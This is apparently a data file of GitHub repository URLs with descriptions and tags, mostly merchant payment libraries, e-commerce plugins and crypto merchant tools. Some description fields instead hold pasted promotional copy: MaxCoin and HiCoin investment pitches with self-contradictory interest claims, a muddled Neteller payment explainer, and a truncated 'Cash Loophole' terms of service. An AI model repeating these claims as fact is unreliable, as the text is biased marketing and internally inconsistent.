0,https://github.com/clarkduvall/coinbase-snapshot.git,"A snapshot of your Coinbase account: your current Bitcoin balance, net profit, and merchant orders.",,5
0,https://github.com/JorgenVatle/xsolla.git,üíé A Node.js client for working with the Xsolla Merchant API.,,5
0,https://github.com/openminds/activemerchant-ogone.git,Deprecated - This is changed as plugin/gem to activemerchant at http://github.com/DefV/active_merchant_ogone,,5
0,https://github.com/harsh6768/awesome-stripe.git,Project contains scenario of cab riding or any on demand services where we need to transfer the funds or amount to the merchant account,"stripe,stripe-connect,stripe-api,boom,bluebird",5
0,https://github.com/nasa8x/printify-api.git,"{""Printify's REST API allows your application to manage a Printify shop on behalf of a Printify Merchant. Create products, submit orders, and more...""}",,5
0,https://github.com/irbis-labs/ccxt-rs.git,A Rust library for cryptocurrency trading and e-commerce with support for many bitcoin/ether/altcoin exchange markets and merchant APIs.,,5
0,https://github.com/codewithpatelo/aopjs.git,"More than a billion of the rural merchants in the developing world commonly depend on hiring on-demand transportation services to commute people or goods to markets. The process of selecting the optimal fare involves handling decision-making characterised with multiple alternatives and competing criteria. Decision support systems are commonly used to solve these types of problems. However, most widely used systems are based on object-based approaches which lack high-level abstractions needed to effectively model and scale human-machine communication. This paper reviews previous literature on the field and introduces an improved preliminary agent-based decision-support approach to overcome those challenges. As a proof of concept, we developed a two-agent simulation that, given a request from one of the agents, the other one takes a dataset of a stratified sample of 104 Ethiopian commuter criteria preferences taken from the Dukem region and an exemplary dataset of fare alternatives. The assistant agent computes those datasets using widely used HPA and TOPSIS algorithms to weight, score, rank those alternatives. Once we run the simulation, in a matter of milliseconds the assistant agent effectively returns an optimal prescription to the other agent, storing all interactions in a self-contained memory resulting in an architecture that allows developers to program further customisation as interactions scale.","decision-support,multi-agent-systems,agent-based-modeling,agent-oriented-programming,javascript,prescriptive-analytics,mobility,mobility-modeling,ethiopia",5
0,https://github.com/BlockchainLabs/MaxCoin.git,"{""There is a lot of uncertainty about of Bitcoin, so many turn to the altcoin market to diversity their crypto holdings, only to find more uncertainty. CoinMarketCap lists over 500 coins, and there are probably more. In this brief post, I offer Maxcoin‚Äôs qualifications as a worthy investment and trade currency.  Maxcoin has a dedicated, skilled, and cognizant foundation team that understands both the economics and politics of cryptocurrency. Crypto is not just a faster and cheaper payment method and a more secure store of value, it‚Äôs about decentralizing the use of currency by removing it from the establishment‚Äôs monopoly. Cryptocurrency allows you to buy and sell and give and save apart from state and bank run spy grids and theft rings. Because you own your coins which are transacted with high cryptography on a decentralized public blockchain, there are no extortionate fees, bank runs, frozen accounts, bailouts, or financial surveillance. The Maxcoin team understands the importance of using your coins in privacy and with security.  Our team members also have a various skill from their professional backgrounds in system administration, programming, web design, technical writing, project management, quality assurance, market trading, and others. More important is their enthusiastic entrepreneurship and dedication to expanding and enriching the Maxcoin ecosystem. Our team members spend countless unpaid hours of planning and building for Maxcoin. Learn more about our team here.  We believe Maxcoin has basic advantages that distinguish it from other altcoins. Here are a few:  Fundamentals  Stronger encryption (SHA3), faster transactions (1 minute block time), low inflation (16 coins per block) Budding Maxcoin Foundation with a roadmap to self-sustainability A one-of-a-kind Maxcoin Bounty Program that allows you to anonymously and immediately donate MAX and BTC to crowdsource the development of Maxcoin‚Äôs critical infrastructure and ecosystem Markets and Services  Listed on 7 exchanges including Cryptsy, Bittrex, Bittylicious, and BTER with 4 currency pairs Revolutionary Cryptobullion (startjoin.com/maxcoinbullion) that will soon be available from selected bullion dealers. Maxcoin can be spent anywhere Bitcoin is accepted through Coingateway.net Buy over 150 gift cards with Maxcoin (Pock.io) Maxcoin Gambling (Cryptobetfair.com) Integration into multicurrency wallet at Casheer.net, Oct 2015 Community and Exposure  Exposure to over 9,000 followers on twitter, more than Ripple, Darkcoin, NXT and many others with more market cap. Maxcoin Forums (forum.maxcoin.co.uk) and chat (maxchat.info) Other communication channels available at Facebook and Bitcointalk This list of distinguishing characteristics doesn‚Äôt change the market price overnight. Like many coins, Maxcoin has seen its share of malicious miners, speculative day traders,  and committed internet trolls. These people are either jealous of the above points or simply foolish and enjoy throwing away treasure. Yes, we are biased, but we genuinely think that Maxcoin is a bargain wonder coin. On the markets, it is at historic lows. But objectively, given its present facts and future goals, Maxcoin is at historic highs. | WHY MAXCOIN MAXCOIN IS MONEY WITHOUT BANKS. USING MAXCOIN, YOU CAN INSTANTLY, SECURELY AND FOR FREE SEND AND RECEIVE PAYMENTS TO FRIENDS, FAMILY AND MERCHANTS WORLDWIDE. A NEW APPROACH TO INNOVATION  MaxCoin is one of the most secure crypto currencies, both because it's based on next generation encryption, SHA3, but also because it's 'open source'. MaxCoin's software is open to inspection and improvement by the best security minds on the planet so that it's mathematically secure. If you don't like paying bank charges, if you don't like the way money is created by banks at no cost to them, and then loaned out to us with interest, then MaxCoin is paving the way to a new money. Open, transparent, and free of charge. Learn more...     ‚Ä¢ Algorithm: Keccak (SHA-3) ‚Ä¢ Generation: 100 million MAX ‚Ä¢ Block time: 1 minute ‚Ä¢ Block Rewards: 16 coins per block ‚Ä¢ Halving every ~4 years ‚Ä¢ Premine: Zero ‚Äì not premined ‚Ä¢ Fees: Zero ‚Äì no transaction fees ‚Ä¢ Difficulty: Retargets every block ""}",,5
0,https://github.com/sudarshan89/merchant-galaxy.git,Merchant guide to galaxy,,4
0,https://github.com/Karbovanets/karbo-woocommerce.git,Karbo for WooCommerce is a Wordpress plugin that allows merchants to accept KRB at WooCommerce-powered online stores.,,4
0,https://github.com/PhonePe/phonepe-php.git,PhonePe PHP Merchant Client Library,,4
0,https://github.com/actionm/laravel-webmoney-merchant.git,Laravel payment processor package for WebMoney Merchant,"laravel-webmoney,laravel-merchant,laravel-payments,accept-payments,webmoney-merchant,webmoney,laravel-5-package",4
0,https://github.com/getsafepay/safepay-woocommerce-plugin.git,Wordpress & Woocommerce plugin to enable Safepay Checkout for merchants,,4
0,https://github.com/PrestaShop/ps_themecusto.git,This module guides the merchant on customizing the look of their shop,"prestashop,prestashop-module,native-module,hacktoberfest",4
0,https://github.com/mattbaird/restful_active_merchant.git,"RESTful, JSON wrapper around active_merchant",,4
0,https://github.com/jswebdevel/btcbox.git,A very simple Bitcoin merchant solution. ,,4
0,https://github.com/RazerMS/Prestashop_Plugin.git,Razer Merchant Services Prestashop Shopping Cart Plugin,,4
0,https://github.com/men232/node-unitpay.git,Unitpay merchant,,4
0,https://github.com/ing-bank/ing-ideal-connectors-php.git,Opensource tools and API to connect webshops and merchants to ING using iDeal,,4
0,https://github.com/gaiazov/Elavon.Net.git,.Net wrapper for Elavon Virtual Merchant,,4
0,https://github.com/Seniru/merchant.git,The repository of the transformice module merchant,"transformice,game,lua,module,transformice-module",4
0,https://github.com/estuans/django-oscar-gmerchant.git,Integration with Google Merchant Center and Django Oscar,,4
0,https://github.com/RiceKaggle/EloMerchantKaggle.git,This is a repository for elo merchant kaggle competition.,"kaggle,python,machine-learning,feature-engineering,lightgbm,catboost,decision-tree",4
0,https://github.com/shenoudab/active_merchant_migs.git,MasterCard Internet Gateway Service (MIGS) Gateway support for Active Merchant,,4
0,https://github.com/Alchemy-GPS/cryptocurrency-cashier-android.git,Android cryptocurrency cashier APP for merchants,,4
0,https://github.com/subchannel13/MerchantRPG-combinator.git,Merchant RPG tool for finding best equipment build.,,4
0,https://github.com/sjkingo/django-commweb.git,A Django module for interfacing with the CommWeb merchant gateway,"python,python-2-7,python-3,django,django-application,commweb,cartridge",4
0,https://github.com/button/button-merchant-android.git,An open source client library for Button merchants.,,4
0,https://github.com/yabacon/paystack-recurrent-billing-wordpress.git,Paystack Recurrent Billing allows you to accept online instalmental and recurrent payments from local and international customers. Allows merchants include a Paystack Inline popup that allows subscription to a plan created on their dashboard via shortcode on their website. The subscription is active until an optional target is paid or the user/merchant cancels the subscription.,,4
0,https://github.com/scala-network/ScalaPay-Merchant-NPM.git,ScalaPay Merchant Endpoint NPM Module,"crypto,scalapay,nodejs,npm",4
0,https://github.com/opengento/magento2-document.git,This module aims to help merchants to manage easily their documents in Magento 2.,"php,magento2,magento,magento2-module,magento2-extension,magento-extension,magento-module,magento-2,magento2-extension-free,document-management",4
0,https://github.com/Matt75/fixconfigurationlang.git,A PrestaShop module for help merchants to adds missing configuration multi language keys,,4
0,https://github.com/TSYS-Merchant/shopping-cart-integrations.git,"{""Plugins that integrate Merchant Warehouse's payment processing solution into various online shopping carts""}",,4
0,https://github.com/wrhansen/eBay-LMS-API.git,"{""Python api to create and upload a BulkDataExchange request to eBay's Large Merchant Services ""}",,4
0,https://github.com/mivaecommerce/api-sdk-php.git,Miva Merchant JSON API SDK for PHP,"miva,miva-api,api-wrapper,sdk",4
0,https://github.com/joebluems/BreachDetection.git,Using Apache Drill to calculate log-likelihood Breach Score for Merchants to find source of compromised accounts,,4
0,https://github.com/Arcadier/Recommended-Retail-Price-Fields.git,Show your consumers how much they‚Äôre saving - let merchants display both the original and discounted prices of their items,"plug-in,arcadier,marketplace,customisation,pricing",4
0,https://github.com/SirFrancisDrake/Babylon-5--We-ve-Lost-Her.git,"{""a `Sea Legends'-like roaming-merchant game written in Haskell""}",,4
0,https://github.com/oqasem1/EzyCards.git,"{""Facebook-Store-StopShop ShopOnline EzyGate allow merchants who don't have online store to start selling and showing their products on their facebook pages simply and quickly""}",,4
0,https://github.com/noudadrichem/dynamic-feed-validator.git,üîçüë®üèª\u200düíªÔ∏èValidates Google Merchant product feeds by streaming XML RSS feeds via Java and push notifications to an Angular front-end via WebSockets.,"java,typescript,angular,jersey,postgresql,docker-compose",4
0,https://github.com/Mondido/mondido-js.git,The JavaScript payment form that enable merchant to do client side encrypted payments.,,4
0,https://github.com/ChinaepayUSACorporation/Merchant_Scan_User_Biz_Docs.git,"{""This is the biz documents of some merchant to scan subscriber's Wechang QR Code.""}",,4
0,https://github.com/ChinaepayUSACorporation/User_Scan_Merchant_Biz_Docs.git,"{""It's thd biz documents for user to scan merchant's QR code.""}",,4
0,https://github.com/ryanzhou/CoinJar.git,NPM (node.js) library for CoinJar (https://coinjar.io) Bitcoin merchant and account API,,4
0,https://github.com/sirdeggen/openBaemail.git,"Baemail Protocol, send from anywhere. Requires merchant registration for just now.",,4
0,https://github.com/customify/customify-cli.git,A software based tool for merchant to maintain relationship with their clients. ,"java,tcp,mysql",4
0,https://github.com/pavlenex/Bitcoin-Payments.git,Designing a set of guidelines for those interested in building Bitcoin merchant applications üèóÔ∏è,"bitcoin,bitcoin-payments,bitcoin-merchant",4
0,https://github.com/ryaan-anthony/magento-members-only.git,Members-only extension for Magento 1.x. allows merchants to hide prices from the public and require admin approval for new user registrations. Logged in members have full access. Can be configured per website. ,,4
0,https://github.com/kancart/osCommerce-API-service-by-Kancart.com-Mobile.git,"This is a http/json API service for osCommerce (user, address, item, shopping cart, checkout, order, full shopping life cycle support). Kancart.com provide iOS, Android app and Mobile template / theme solution for merchants.",,4
0,https://github.com/jakemedal/OSRSFlippingTool.git,[Deprecated --> osrs-flipping-tool-webapp] A tool which scans the Oldschool Runescape marketplace for optimal merchanting items.,,4
0,https://github.com/SamClayton/GalaxyTraders.git,"A space merchant game written in Meteor, based on a lineage of games dating back to the 1970s PC game Star Traders",,4
0,https://github.com/GG4mida/tronpay-document.git,"ÊúÄ‰Ω≥ USDT.TRC20 ËΩ¨Ë¥¶Êé•Âè£ÊúçÂä°ÔºåÁ®≥ÂÆöÂÆâÂÖ®ÔºåÁßíÁ∫ßÂà∞Ë¥¶„ÄÇTether Wallet API, Crypto Payment API, Crypto Merchant Account, Crypto Payment Gateway, Tether TRC20, TRC20 Payment API, TRC20 Wallet API, TRON Payment API, TRON Wallet API, USDT Payment API, USDT Wallet API, TRON Tether API, TRON API, TRC20 API","usdtapi,usdtpay,tronpay,tronapi,trc20api,trc20pay,trc20,tronwallet,trc20wallet,tron-api,trc20-pay,trc20-api,usdt-api,usdt-pay",4
0,https://github.com/inspire/amember.git,"{""This is a plugin for using amember with inspire gateway's merchant vault.  The plugin allows for deployment of a PCI level 1 compliant amember instance in terms of card storage and encyption requirements.""}",,4
0,https://github.com/pweightman/apw_php_magento_google_data_feed.git,"Google Merchant Data Feed for Magento written in PHP using DOM Document XML, this script is provided as is, and will need modification prior to use, it has been published purely as an example and is not for commercial use.",,4
0,https://github.com/rakshitshah94/paypal-sandbox-java-hibernate-integration-demo.git,"Paypal payment module using Hibernate java. You need to make two accounts on paypal SANDBOX [one is for merchant and other is for customer, link is given below for testing].","paypal-sandbox,paypal-payments,integrating-paypal,paypal,api",4
0,https://github.com/PrestaShop/welcome.git,"{""This module helps merchants create their first product and discover their new shop's main features.""}","prestashop-module,native-module,prestashop",3
0,https://github.com/gzcocoa/easypay.git,"A web payment system. Merchants can use it as a cashier, and consumers can pay money to merchants by it.",,3
0,https://github.com/vippsas/vipps-signup-api.git,Vipps Signup API (for partners to sign up merchants),vipps,3
0,https://github.com/ChumakovAnton/yii2-tinkoff-pay.git,Extension for oplata.tinkoff.ru merchant API,,3
0,https://github.com/oxipay/oxidocs.git,Oxipay documentation for merchants and custom integrators,,3
0,https://github.com/diem/reference-merchant.git,A demonstration merchant solution.,,3
0,https://github.com/geopayme/BTCMerchant.git,A BTC Merchant POS app for Android,,3
0,https://github.com/ing-bank/ing-ideal-connectors-net.git,Opensource tools and API to connect webshops and merchants to ING using iDeal,,3
0,https://github.com/SpectroFinance/SpectroCoin-Merchant-Java.git,Sample Java client for communicating with SpectroCoin Bitcoin Merchant API,,3
0,https://github.com/bitbill/merchantApi.git,Api for Ownbit Merchant Wallet,,3
0,https://github.com/SpectroFinance/SpectroCoin-Merchant-API.git,SpectroCoin Bitcoin merchant API specification,,3
0,https://github.com/RazerMS/rms-mobile-xdk-cordova.git,"Razer Merchant Services mobile payment for Cordova (Plugin) (IONIC, Framework7 Compatible)",,3
0,https://github.com/Makewebbetter/points-and-rewards-for-woocommerce.git,"Points and Rewards for WooCommerce plugin help merchants to improve their brand value and retain customers by setting up a points-based loyalty program for their online stores. With this plugin, merchants can reward their loyal customers by awarding points on their online activities. Customers can further redeem earned points for rewards.","points,rewards,points-and-rewards,loyalty,woocommerce",3
0,https://github.com/ferhan/AmazonOrders.git,"Retrieve order history for a merchant, using Amazon Orders API.",,3
0,https://github.com/Platron/platron_merch_reference.git,Platron merchant reference,,3
0,https://github.com/segsalerty2013/opay-merchant-cashier-php.git,Merchant Pre-Order API,,3
0,https://github.com/Oceania2018/Coinbase.NetSDK.git,".NET SDK for Full APIs of Coinbase including Wallet, Merchant and Data Endpoints. ",,3
0,https://github.com/usmanasif/Active-Merchant-Paypal-Recurring-payment-support-for-rails-2.x.git,Active Merchant Paypal Recurring payment support for rails 2.x,,3
0,https://github.com/ing-bank/ing-ideal-connectors-java.git,Opensource tools and API to connect webshops and merchants to ING using iDeal ,,3
0,https://github.com/parkersmith/payment_manager.git,Convenience wrapper for the ruby gem active_merchant,,3
0,https://github.com/TeleKeks/merchant.bas.git,"{""Merchant's Quest - the TeleBASIC game""}",,3
0,https://github.com/RapidSoftwareSolutions/Marketplace-Foursquare-Package.git,"{""The Foursquare API gives you access to our world-class places database and the ability to interact with Foursquare users and merchants. Start using the only location API you'll ever need.""}",,3
0,https://github.com/TarkusGSA/LumiRoMerchantsAndroid.git,LumiRo Merchants Monitoring for Android,,3
0,https://github.com/turrgavi/MerchantQR-Nano.git,Python based QR code generator for merchants.,,3
0,https://github.com/princetonmerchants/pma.git,Website for the Princeton Merchants Association,,3
0,https://github.com/rahuldadhich/productxmlfeed.git,Magento 1.x - Product XML feed for Google Merchant Center,,3
0,https://github.com/satels/django-zpayment.git,Integral Online ZPayment Merchant Interface support for Django,,3
0,https://github.com/button/button-merchant-ios.git,An open source client library for Button merchants. ,,3
0,https://github.com/ashleygrush/plaid_loyalty.git,A loyalty tracking API for users and merchants.,,3
0,https://github.com/marcialpaulg/BuxPHP.git,BuxPHP is a PHP library for Bux.ph merchants,,3
0,https://github.com/VSKut/WebMoney-Merchant.git,WebMoney Merchant - PHP Library,,3
0,https://github.com/LklCBPay/api.git,api doc for merchant,,3
0,https://github.com/ragnarak54/DiscordBot.git,Traveling merchant discord bot,,3
0,https://github.com/AudithSoftworks/Nexway-Merchant-API-PHP-Client.git,Nexway Merchant API PHP Client,,3
0,https://github.com/tonyynot/usenano.git,Merchant portal for Nano cryptocurrency,"cryptocurrency,nano-cryptocurrency,merchant-portal,jekyll",3
0,https://github.com/webgriffe/SyliusItalianInvoiceableOrderPlugin.git,Sylius plugin which allows Italian merchants to collect invoice data for their orders.,sylius,3
0,https://github.com/bencoderus/laravel-webhook.git,Laravel webhook allows businesses to send webhooks to their merchants/clients with ease. ,"laravel,php,php7,webhook,composer,laravel8",3
0,https://github.com/drager/swish.git,Rust API bindings for the Swish API. https://developer.getswish.se/merchants/,"swish,payment,api-bindings,rust-library,rust",3
0,https://github.com/mivaecommerce/api-sdk-node.git,Miva Merchant JSON API SDK for NodeJS,,3
0,https://github.com/openstream/OSCOM2PostFinance.git,osCommerce Online Merchant 2.2 PostFinance Module,,3
0,https://github.com/null-none/simpla-google-merchant.git,Generate feed for merchant for CMS simpla,,3
0,https://github.com/hiqdev/omnipay-paypal.git,PayPal plugin for PHP merchant library,hacktoberfest,3
0,https://github.com/BrainyWayne/Mobile-Money-Merchant.git,Mobile money merchant locator using realtime GPS,,3
0,https://github.com/akelos/active-merchant.git,Active Merchant for Akelos PHP Framework,,3
0,https://github.com/hulucat/wechat-mch.git,ÊúçÂä°ÂïÜÊ®°Âºè‰∏ãÁöÑÂæÆ‰ø°ÂºÄÂèëSDK„ÄÇA Sdk for merchant model of wechat development.,,3
0,https://github.com/integrationmonitoring/moneta-python3-sdk.git,Python3 SDK to create moneta merchant API driven application,,3
0,https://github.com/calvinfroedge/Codeigniter-Aktive-Merchant.git,Implementation of Aktive Merchant by Andreas Kollaros (PHP),,3
0,https://github.com/raysrashmi/active_merchant.git,extended active merchant plugin to support beanstream APIs...,,3
0,https://github.com/icerockdev/tinkoff-merchant-api.git,Tinkoff Merchant API Kotlin Client - part of BOKO libs,"kotlin,kotlin-jvm,tinkoff,backend",3
0,https://github.com/KiezelPay/fitbit_kpay_merchant_api.git,Library to get the data available via the K¬∑pay merchant API and use it in an app or clockface (https://kiezelpay.com/api/merchant/documentation/),,3
0,https://github.com/thenifemi/petShopMerchant.git,Pet Shop Merchant is a merchant application for the Pet Shop e-commerce application for Android built with Flutter (iOS to come soon). ,,3
0,https://github.com/JoseAlba/BitBuy.git,"Merchants who register on the site will have the ability to set up their own accounts for selling their own digital products or services in exchange for Bitcoin. Likewise, consumers who are in the market for purchasing digital content will have the ability to interface with these merchants and set up an exchange for goods and services.",,3
0,https://github.com/clearhaus/applepaymerchant.git,Clearhaus Apple Pay merchant used internally for testing our Apple Pay compatibility,,3
0,https://github.com/twanvl/sts-shop-mod.git,"{""Modifies the merchant's shop, allowing you to buy more items""}",,3
0,https://github.com/jessesadler/jdo-sterfhuis.git,A digital humanities project on the estate of a 16th-century merchant,"digital-humanities,history,r",3
0,https://github.com/stevenmirabito/tpm-plus.git,"{""A Chrome extension to add additional functionality to The Plastic Merchant's Bulk Seller Platform.""}",,3
0,https://github.com/Wincoinofficial/wincoin.git,"WINCOIN (WC), which is known for its blockchain-based platform which its future development trends and values are also expected to grow and expand in time. The circulation of WC asset are fundamentally reinforced by the strong merchant of lifestyle ecosystem and backed by phenomenal loyal supporters‚Äô from all around the globe.","wincoin,cryptocurrency,bitcoinbased,cryptography,wc",3
0,https://github.com/kancart/Zencart-Web-API-service-by-Kancart.com-Mobile.git,"This is a http/json API service for Zencart (user, address, item, shopping cart, checkout, order, full shopping life cycle support). Kancart.com provide iOS, Android app and Mobile template / theme solution for merchants.",,3
0,https://github.com/ziggr/ESO-MMExtractor.git,Elder Scrolls Online: Lua code to read Master Merchant data and extract useful information to a spreadsheet.,,3
0,https://github.com/VictorZhang2014/Apple-Pay-Demo.git,This is a Apple Pay Demo . If you download it and run it before you must apply yourself Merchant ID.,,3
0,https://github.com/Nsisodia91/myzeeeinc.git,This is basic Project considering one of the shipping API merchant thats been used for making purchase,,3
0,https://github.com/ChowRobin/awm.git,"The api of the takeaway application, based on Spring, is provided to the user client and the merchant client data api.","springboot,takeaway",3
0,https://github.com/shopgate/cart-integration-sdk.git,"The Shopgate Cart Integration SDK (formerly: Shopgate Library) is a compilation of classes to manage the communication between your shop system and Shopgate via the Shopgate Plugin API and the Shopgate Merchant API. The SDK provides methods for processing incoming and outgoing requests, configuration options and for handling errors.",,3
0,https://github.com/developersteve/WooCommerce-PayPal-Here.git,"This is a basic plugin to allow PayPal Here, to be used with WooCommerce for use in popup stores or self serve booths this allows a merchant to be able to quickly and easily accept in-person credit cards ",,3
0,https://github.com/StocksExchange/swift-client.git,"{""STEX (former Stocks.Exchange) provides all the core exchange functionality, and additional merchant tools available via the HTTP API where all returned messages are in model class. It's much easier to work with the API by using one of the clients provided by STEX, so while this page describes the API in case you want or need to build your own client, the examples use the Swift client.""}",,3
0,https://github.com/libsv/payd.git,"Payd is a work in progress reference implementation of the Payment Protocol/BIP (2)70 which defines a method for handling payment requests from users and the user fulfilling that request. A classic example being a merchant who owns a shop taking payments from customers. It does not run a full node to validate transaction inputs, rather, it will utilise SPV and the Headers Client to leverage merkle proof validation and broadcast using mAPI.","bsv,bitcoin,merchant,golang,spv,liteclient,mapi",3
0,https://github.com/robertoashworth/How-to-integrate-Neteller-Payment-method-on-your-App.git,"How to integrate Neteller Payment method on your App   Neteller.com became one of the most popular payment gateways . There are a lot of merchants depend on Neteller as a main payment method for their customers .    How Do Neteller Payment Gateways Work? (1)The cuthstomer places an order on your website by pressing the ""Submit Order"" or equivalent button, or perhaps enters their card details using an automatic phone answering service.    (2) If the order is via Application, the customer\'s phone browser encrypts the information to be sent between the browser and the merchant\'s web server through a secure socket layer.     (3)Subsequently, the merchant then forwards the transaction details to their payment gateway like Neteller , through a secure socket layer again.  (4) Afterwards, the payment gateway sends the transaction information to the payment processor used by the merchant\'s acquiring bank.    (5) Then the payment processor transfers the transaction info to the card association (Visa / Master card).   (6) To get the payment to your Neteller account, you must link a valid credit card with it either Master or Visa.   7) In an intra-transaction from Neteller to Neteller account, it is important that both accounts have valid credit cards for the transaction to go smoothly. Once the buyer makes a payment through Neteller, the amount will be deducted from their credit card balance and the seller will see the value added in their credit card directly.    (8) Protect your account and make sure that the payment goes to your valid credit card on your Neteller accounts. You must enter CVV/CVS number when entering the credit card details as the number is linked to the API created between application and Neteller accounts. Once the link is established then every transaction is going to be checked by matching the number for the transaction to go smoothly.         ( 9 ) After you get the payment to your credit card account, you will have 3 options:  The first is that you can withdraw the funds through ATM.  The second is that you can transfer the funds to your bank account.  The third is that you can deposit the funds into your Neteller account.",,3
0,https://github.com/BlockchainLabs/HiCoin.git,"Start Of Efficient Digital HIcoin HICoin has many features and advantages.  It has an ideal HIcoin to transfer anywhere, anytime money to friends HIcoin is a Pos(proof-of-stake) Internet currency that enables instant, near-zero cost payments to anyone in the world.    HIcoin‚Äôs Key Features HIcoin features faster transaction confirmation times and improved storage efficiency than the leading math-based currency.  HIcoin is open-source; its design is public, nobody owns or controls HIcoin and everyone can take part.  HIcoin network does not require the use of large-scale, specialized hardware operations.  HIcoin is far more energy-efficient than traditional digital currency networks.  Wallet encryption allows you to secure your wallet, so that you can view transactions and your account balance, but are required to enter your password before spending HIcoins.  This provides protection from wallet-stealing viruses and trojans as well as a sanity check before sending payments. Look for hicoin in more point of sale applications soon with recent addition to merchant services.    SPECIFICATIONS   / POS INTEREST: PoS (Proof-of-Stake) 5% yearly (from non-reserved wallet balance)  / ALGORITHM: Scrypt  / SYMBOL: XHI  / BLOCK TIME: 60 sec  / LAST POW BLOCK: 3600  / TOTAL MONEY SUPPLY: 10,000,000,000 XHI  / BLOCK REWARD: BLOCKS 1-10 (premine): each 1,000,000,000 XHI / BLOCKS 11~3600: 100 XHI  / COIN POS AGE: Min. 1 hour / Max. unlimited  / RPC PORT: 35288 (testnet 45288 )  / P2P PORT: 35289 (testnet 45289 )  / Coin maturity: 100 confirmations | KEY FEATURES Security and control over your money secure against the attacks other digital currencies face due to their reliability on large-scale mining operations  Fast international payments HICoin is the ideal digital currency for face to face transactions and all applications that value speed.  1% compound interest yearly You will earn rewards every few days, depending on the size of your holdings, adding up to 5% interest yearly.  FEATURES MESSAGES Big Miners Back Bitcoin Classic As Scaling Debate Evolves Following a months-long debate on how best to scale the bitcoin network to accommodate a greater number of transactions, bitcoin mining firms are voicing their support for a newly introduced proposal called Bitcoin Classic. Though a new entrant to the debate, Bitcoin Classic so far has the support of bitcoin developers including former Bitcoin Core  Read More admin  01/19/2016  - 5 Must-Read Excerpts from the UK Government‚Äôs Blockchain Report ‚ÄúThe progress of mankind is marked by the rise of new technologies and the human ingenuity they unlock.‚Äù That‚Äôs the glowing foreword to a new report on blockchain and distributed ledger tech issued by the UK government‚Äôs Chief Scientific Adviser this week. Taking a positive outlook on the emerging technology, the document recommends a broad government initiative to develop and demonstrate blockchain and distributed  Read More admin  01/19/2016  - Is Digital Asset‚Äôs $50 Million Funding a Blow to Bitcoin? VCs Weigh In Founded in 2014 and led by CEO and ex-JP Morgan executive Blythe Masters, Digital Asset Holdings had long been the subject of speculation that suggested that, despite its high-profile leadership, the startup was having difficulties raising an initial funding round. All that uncertainty was laid to rest last week, however, when Digital Asset silenced rumors  Read More admin  01/12/2016  0 Our Team Project Manager TIMO SPRAY  Business Development JASON LANE  Art Director TONYA GARCIA  Account Manager ASHLEY SUJAN It Has An Ideal Hicoin To Transfer Anywhere, Anytime Money To Friends. WALLET ",,3
0,https://github.com/mdxedia/Awsome-Cash.git,"Updated January 2016  Note on translation: These Website Terms of Service may have been translated into various languages for the convenience of Cash Loophole Users. While the translation is correct to the best of Cash Loophole knowledge, Cash Loophole is not responsible or liable in the event of an inaccuracy. English is the controlling language of these Terms of Service, and any translation has been prepared for you as a courtesy only. In the event of a conflict between the English-language version of these Terms of Service and a version that has been translated into another language, the English-language version shall control.  The Cash Loophole Website, is an online information service with downloadable software, provided by Cash Loophole, and is subject to the terms and conditions set forth below.  IMPORTANT: These terms and conditions constitute a legal agreement between you, the User (hereafter ‚ÄúYou‚Äù, ‚ÄúYour‚Äù, or the ‚ÄúUser‚Äù), and us, Cash Loophole, its affiliates, and all of their respective authorized representatives, officers, directors, employees, agents, shareholders, licensors, attorneys, successors, and assigns (hereafter ‚ÄúUs‚Äù or ‚ÄúCash Loophole‚Äù), and together with the Website Privacy Policy and the Software License Agreement, wholly and exclusively govern such relationship.  BEFORE ACCESSING OR USING THE SERVICES OFFERED ON FIVEMINUTEEXPERIMENT.CO, PLEASE READ CAREFULLY THE FOLLOWING TERMS AND CONDITIONS CONTAINED IN THIS WEBSITE TERMS OF SERVICE AGREEMENT. THESE TERMS GOVERN YOUR ACCESS TO AND USE OF THE SITE AND ANY PROGRAMS, SERVICES, TOOLS, SOFTWARE, MATERIALS, OR OTHER INFORMATION AVAILABLE THROUGH THE SITE OR USED IN CONNECTION THEREWITH (collectively, ‚Äúthe Site‚Äù). Cash Loophole IS WILLING TO LICENSE AND ALLOW THE USE OF THIS SITE ONLY ON THE CONDITION THAT YOU ACCEPT AND AGREE TO ALL OF THE TERMS AND CONDITIONS CONTAINED THEREIN. BY USING THE SITE, YOU THEREFORE AGREE TO BE BOUND BY THE TERMS AND CONDITIONS SET FORTH BELOW. IF YOU DO NOT WISH TO BE BOUND BY THESE TERMS AND CONDITIONS, YOU ARE NOT GRANTED PERMISSION TO ACCESS OR OTHERWISE USE THE SITE AND ARE INSTRUCTED TO EXIT THE SITE IMMEDIATELY.  Cash Loophole RESERVES THE RIGHT TO MODIFY THIS AGREEMENT AT ANY TIME, WITHOUT NOTICE TO THE USER, AND SUCH MODIFICATIONS SHALL BE EFFECTIVE IMMEDIATELY UPON POSTING OF THE MODIFIED TERMS AND CONDITIONS ON THE SITE. YOU AGREE TO REVIEW THE AGREEMENT PERIODICALLY TO BE AWARE OF SUCH MODIFICATIONS AND YOUR CONTINUED ACCESS OR USE OF THE SITE SHALL BE DEEMED YOUR CONCLUSIVE ACCEPTANCE OF THE MODIFIED AGREEMENT. Revised versions of the Terms and Conditions shall be indicated by the date posted at the top of the Website Terms of Service page (i.e., ‚ÄúUpdated [Date]‚Äù).  PROPRIETARY RIGHTS. All intellectual property of or relating to the Site, including but not limited to content, information, patents, trademarks, copyrights, modules, techniques, know-how, computer code (including html code), algorithms, methods of doing business, user interfaces, graphic design, look and feel, and software; and all developments, derivatives, and improvements thereto, whether registered or not (collectively, ‚ÄúIntellectual Property‚Äù), unless otherwise indicated, are owned, controlled and licensed in their entirety by Cash Loophole, its affiliates, its successors and assigns, and/or by third parties who have granted Cash Loophole license to use such Intellectual Property. Publications, products, content or services referenced herein or on the Site are the exclusive trademarks or service-marks of Cash Loophole or their respective owners and are protected by law. Except as expressly provided herein, Cash Loophole does not grant any express or implied right to You or any other person under any intellectual or proprietary rights. Any downloadable or printable software, programs, information or materials available through the Site and all copyrights, trade secrets, and know-how related thereto, unless otherwise indicated, are owned by Cash Loophole or third party licensors. The website name, Cash Loophole, its logo, and all other names, logos and icons identifying the Cash Loophole website and its services are proprietary trademarks of Cash Loophole, and any use of such marks, such as domain names, without the express written permission of Cash Loophole is strictly prohibited. LIMITED LICENSE GRANT. The Site is provided by Cash Loophole, and conditional with the acceptance of this Website Terms of Service Agreement, provides You with a personal, revocable, limited, non-exclusive, royalty-free, non-transferable license to use the Site and download any programs, services, tools, materials, or information made available through or from the Site. Please note that access to download and terms of use of Cash Loophole downloadable software is contingent on acceptance of the separate Software License Agreement. The Website Terms of Service permit you to use and access for personal use only the Cash Loophole Website (a) on a single laptop, workstation, or computer and (b) on a mobile device from the Internet or through an on-line network. You may also 